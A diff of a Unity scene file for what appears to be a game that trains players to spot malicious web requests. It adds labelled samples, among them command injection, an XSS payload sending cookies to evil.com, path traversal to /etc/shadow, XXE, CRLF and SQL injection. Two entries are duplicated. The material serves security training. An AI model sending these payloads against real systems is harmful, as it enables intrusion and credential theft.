@@ -481,6 +481,129 @@ MonoBehaviour:
       - compartment: {fileID: 551808148}
         payload: 'POST /api/ping HTTP/1.1\nHost: example.com\nContent-Type: application/json\n\n{\n 
           \"host\": \"8.8.8.8; cat /etc/passwd\"\n}'
+    - triggerId: train_wave_7
+      isSuspicious: 1
+      triggerFollowingWaveInList: 1
+      trainIndices: 00000000
+      startAllSelectedTrainsAtOnce: 0
+      delayBeforeWaveStarts: 0
+      snapSelectedTrainsToOffScreenLeftBeforeEntry: 1
+      compartmentData:
+      - compartment: {fileID: 551808148}
+        payload: 'GET /api/convert?file=report.pdf&format=png%60rm+-rf+/tmp%60 HTTP/1.1\nHost:
+          example.com'
+    - triggerId: train_wave_8
+      isSuspicious: 0
+      triggerFollowingWaveInList: 1
+      trainIndices: 00000000
+      startAllSelectedTrainsAtOnce: 0
+      delayBeforeWaveStarts: 0
+      snapSelectedTrainsToOffScreenLeftBeforeEntry: 1
+      compartmentData:
+      - compartment: {fileID: 551808148}
+        payload: 'GET /api/download?filename=Q3-report-2024.pdf HTTP/1.1\nHost: example.com\nAuthorization:
+          Bearer eyJhbGciOiJIUzI1NiJ9...\nAccept: application/pdf'
+    - triggerId: train_wave_9
+      isSuspicious: 1
+      triggerFollowingWaveInList: 1
+      trainIndices: 00000000
+      startAllSelectedTrainsAtOnce: 0
+      delayBeforeWaveStarts: 0
+      snapSelectedTrainsToOffScreenLeftBeforeEntry: 1
+      compartmentData:
+      - compartment: {fileID: 551808148}
+        payload: 'POST /api/comments HTTP/1.1\nHost: example.com\nContent-Type: application/json\n\n{\n 
+          \"body\": \"<script>fetch(''https://evil.com?c=''+document.cookie)</script>\"\n}'
+    - triggerId: train_wave_10
+      isSuspicious: 1
+      triggerFollowingWaveInList: 1
+      trainIndices: 00000000
+      startAllSelectedTrainsAtOnce: 0
+      delayBeforeWaveStarts: 0
+      snapSelectedTrainsToOffScreenLeftBeforeEntry: 1
+      compartmentData:
+      - compartment: {fileID: 551808148}
+        payload: 'GET /api/download?filename=../../../../etc/shadow HTTP/1.1\nHost:
+          example.com\nAuthorization: Bearer eyJhbGciOiJIUzI1Ni...'
+    - triggerId: train_wave_11
+      isSuspicious: 0
+      triggerFollowingWaveInList: 1
+      trainIndices: 00000000
+      startAllSelectedTrainsAtOnce: 0
+      delayBeforeWaveStarts: 0
+      snapSelectedTrainsToOffScreenLeftBeforeEntry: 1
+      compartmentData:
+      - compartment: {fileID: 551808148}
+        payload: 'POST /api/users/find HTTP/1.1\nHost: example.com\nContent-Type:
+          application/json\n\n{\n  \"username\": \"maria.santos\",\n  \"password\":
+          \"correcthorsebatterystaple\"\n}'
+    - triggerId: train_wave_12
+      isSuspicious: 1
+      triggerFollowingWaveInList: 1
+      trainIndices: 00000000
+      startAllSelectedTrainsAtOnce: 0
+      delayBeforeWaveStarts: 0
+      snapSelectedTrainsToOffScreenLeftBeforeEntry: 1
+      compartmentData:
+      - compartment: {fileID: 551808148}
+        payload: 'POST /api/import HTTP/1.1\nHost: example.com\nContent-Type: application/xml\n\n<?xml
+          version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<data><value>&xxe;</value></data>'
+    - triggerId: train_wave_13
+      isSuspicious: 1
+      triggerFollowingWaveInList: 1
+      trainIndices: 00000000
+      startAllSelectedTrainsAtOnce: 0
+      delayBeforeWaveStarts: 0
+      snapSelectedTrainsToOffScreenLeftBeforeEntry: 1
+      compartmentData:
+      - compartment: {fileID: 551808148}
+        payload: 'POST /api/import HTTP/1.1\nHost: example.com\nContent-Type: application/xml\n\n<?xml
+          version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<data><value>&xxe;</value></data>'
+    - triggerId: train_wave_14
+      isSuspicious: 1
+      triggerFollowingWaveInList: 1
+      trainIndices: 00000000
+      startAllSelectedTrainsAtOnce: 0
+      delayBeforeWaveStarts: 0
+      snapSelectedTrainsToOffScreenLeftBeforeEntry: 1
+      compartmentData:
+      - compartment: {fileID: 551808148}
+        payload: 'GET /api/redirect?url=https://partner.com%0d%0aSet-Cookie:%20session=hijacked%3Bhttponly
+          HTTP/1.1\nHost: example.com'
+    - triggerId: train_wave_15
+      isSuspicious: 0
+      triggerFollowingWaveInList: 1
+      trainIndices: 00000000
+      startAllSelectedTrainsAtOnce: 0
+      delayBeforeWaveStarts: 0
+      snapSelectedTrainsToOffScreenLeftBeforeEntry: 1
+      compartmentData:
+      - compartment: {fileID: 551808148}
+        payload: 'POST /api/import HTTP/1.1\nHost: example.com\nContent-Type: application/xml\n\n<?xml
+          version=\"1.0\" encoding=\"UTF-8\"?>\n<employees>\n  <employee>\n    <id>101</id>\n   
+          <n>Bob Chen</n>\n    <dept>Engineering</dept>\n  </employee>\n</employees>'
+    - triggerId: train_wave_16
+      isSuspicious: 1
+      triggerFollowingWaveInList: 1
+      trainIndices: 00000000
+      startAllSelectedTrainsAtOnce: 0
+      delayBeforeWaveStarts: 0
+      snapSelectedTrainsToOffScreenLeftBeforeEntry: 1
+      compartmentData:
+      - compartment: {fileID: 551808148}
+        payload: 'DELETE /api/users/delete?user_id=1 OR 1=1 HTTP/1.1\nHost: example.com\nAuthorization:
+          Bearer user_token'
+    - triggerId: train_wave_16
+      isSuspicious: 1
+      triggerFollowingWaveInList: 1
+      trainIndices: 00000000
+      startAllSelectedTrainsAtOnce: 0
+      delayBeforeWaveStarts: 0
+      snapSelectedTrainsToOffScreenLeftBeforeEntry: 1
+      compartmentData:
+      - compartment: {fileID: 551808148}
+        payload: 'DELETE /api/files/delete?file=../../../../etc/passwd HTTP/1.1\nHost:
+          example.com'
 --- !u!4 &410981257
 Transform:
   m_ObjectHideFlags: 0
@@ -3025,7 +3148,7 @@ PrefabInstance:
       objectReference: {fileID: 0}
     - target: {fileID: 4000000000000000065, guid: 865b54efe8644c540b91ab15846d8360, type: 3}
       propertyPath: enableRemoteJudge
-      value: 1
+      value: 0
       objectReference: {fileID: 0}
     - target: {fileID: 4855139162035812077, guid: 865b54efe8644c540b91ab15846d8360, type: 3}
       propertyPath: m_SizeDelta.x
